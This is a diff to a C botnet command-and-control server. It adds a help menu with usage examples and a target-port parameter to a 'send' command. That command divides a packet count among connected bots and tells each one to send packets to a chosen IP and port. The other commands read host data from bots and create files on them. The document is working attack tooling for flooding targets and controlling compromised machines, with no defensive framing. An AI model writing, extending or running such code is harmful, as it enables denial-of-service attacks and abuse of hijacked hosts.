@@ -20,7 +20,7 @@ int main(int argc, char **argv)
    int server_sockfd, client_sockfd, sockfd;
    int state, nread;
    socklen_t client_len;
-   int i,max;
+   int i,max,dst_port;
    int count = 0;
    char id[MAX_SOCKET][2];
 
@@ -74,11 +74,12 @@ int main(int argc, char **argv)
    max = 0;
 
    printf("/***************MENU***************/\n");
-   printf("1) Show bot hierarchy\n");
-   printf("2) Read (Host or Date)\n");
-   printf("3) Create file\n");
-   printf("4) Send packet\n");
-   printf("5) Search bots\n");
+   printf("1) Show bot hierarchy > show\n");
+   printf("2) Read (host or date) > read [bot_number] [host/date]\n");
+   printf("3) Create file > create [bot_number] [route]\n");
+   printf("4) Send packet > send [number of packet] [target IP] [ target Port]\n");
+   printf("5) Search bots > search [bot_number]\n");
+   printf("6) Help > help\n");
    printf("/**********************************/\n");
 
    while(1)
@@ -118,6 +119,23 @@ int main(int argc, char **argv)
            fgets(message,255,stdin);
            if(strlen(message) < 2)
                continue;
+           if(strstr(message,"help"))
+           {
+               printf("/***************MENU***************/\n");
+               printf("1) Show bot hierarchy > show\n");
+               printf("2) Read (host or date) > read [bot_number] [host/date]\n");
+               printf("3) Create file > create [bot_number] [route]\n");
+               printf("4) Send packet > send [number of packet] [target IP] [ target Port]\n");
+               printf("5) Search bots > search [bot_number]\n");
+               printf("6) Help > help\n");
+               printf("/**********************************/\n");
+               printf("Examples : \n");
+               printf("show\n");
+               printf("read 14 host\n");
+               printf("create 25 /home/text.txt\n");
+               printf("send 30 127.0.0.1 80\n");
+               printf("search 37\n");
+           }
            strncpy(message_temp,message,sizeof(message_temp));
            temp = strtok(message_temp," ");
            strncpy(instruction,temp,sizeof(temp));
@@ -148,13 +166,15 @@ int main(int argc, char **argv)
                num_packet = atoi(temp);
                temp = strtok(NULL," ");
                strncpy(ip_addr,temp,sizeof(ip_addr));
+               temp = strtok(NULL," ");
+               dst_port = atoi(temp);
                
                for(i=1;i<MAX_SOCKET;i++)
                    if(client[i].fd >= 0)
                        superbot_count++;
 
                num_packet = num_packet / superbot_count;
-               sprintf(send_temp,"send %d %s",num_packet,ip_addr);
+               sprintf(send_temp,"send %d %s %d",num_packet,ip_addr,dst_port);
                
                for(i=1;i<MAX_SOCKET;i++)
                {
